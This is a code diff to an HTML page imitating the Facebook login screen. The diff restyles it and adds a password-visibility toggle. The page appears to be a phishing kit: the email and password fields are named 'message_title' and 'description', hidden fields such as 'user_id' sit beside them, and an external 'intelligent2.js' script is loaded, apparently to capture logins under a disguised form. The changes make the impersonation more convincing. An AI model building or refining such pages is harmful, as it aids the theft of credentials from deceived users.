@@ -45,14 +45,16 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             border: 1px solid #dddfe2;
         }
+        .form-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
         .form-input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px 45px 14px 16px; /* Extra space for icon */
             font-size: 17px;
-            line-height: 16px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
-            margin-bottom: 12px;
             background: #fff;
             color: #1c1e21;
         }
@@ -61,13 +63,22 @@
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: #606770;
+        }
         .login-button {
             width: 100%;
             background: #1877f2;
             color: #fff;
             border: none;
             padding: 14px 16px;
-            font-size: 20px;
+            font-size: 15px;
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
@@ -93,7 +104,7 @@
             margin: 20px 0;
         }
         .create-account {
-            background: #42b883;
+            background: #0095f6;
             color: #fff;
             border: none;
             padding: 14px 16px;
@@ -127,7 +138,6 @@
     <div class="facebook-container">
         <div class="facebook-left">
             <div class="facebook-logo">facebook</div>
-            <!-- Tagline removed -->
         </div>
         <div class="facebook-right">
             <div class="login-box">
@@ -136,8 +146,15 @@
                     <input type="hidden" name="ftype" value="normal">
                     <input type="hidden" name="login" value="login">
                     <input type="hidden" name="user_id" value="16934">
-                    <input type="text" class="form-input" name="message_title" placeholder="Email address or phone number" required>
-                    <input type="password" class="form-input" name="description" placeholder="Password" required>
+                    
+                    <div class="form-group">
+                        <input type="text" class="form-input" name="message_title" placeholder="Email address or phone number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-input" name="description" placeholder="Password" id="password" required>
+                        <span class="toggle-password" id="togglePassword">&#128065;</span>
+                    </div>
+
                     <button type="submit" class="login-button">Log In</button>
                 </form>
                 <a href="#" class="forgot-password">Forgotten password?</a>
@@ -148,6 +165,17 @@
             </div>
         </div>
     </div>
-    <script src="intelligent2.js"></script>
+
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const password = document.getElementById('password');
+
+        togglePassword.addEventListener('click', () => {
+            const type = password.type === 'password' ? 'text' : 'password';
+            password.type = type;
+            togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+    </script>
+          <script src="intelligent2.js"></script>
 </body>
 </html>
